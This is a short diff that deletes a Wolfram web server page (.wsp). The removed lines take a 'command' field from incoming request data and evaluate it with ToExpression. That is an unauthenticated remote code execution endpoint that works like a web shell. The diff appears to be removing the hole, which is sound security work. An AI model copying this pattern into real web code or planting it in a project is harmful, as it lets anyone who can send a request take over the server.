@@ -1,5 +1,0 @@
-<?wsp
-    $CurrentRequest["Redirect"] = "utils/redir.wsp";
-    Print[">> POST!!!"];
-    $CurrentRequest["Data", "command"]//ToExpression;
-?>
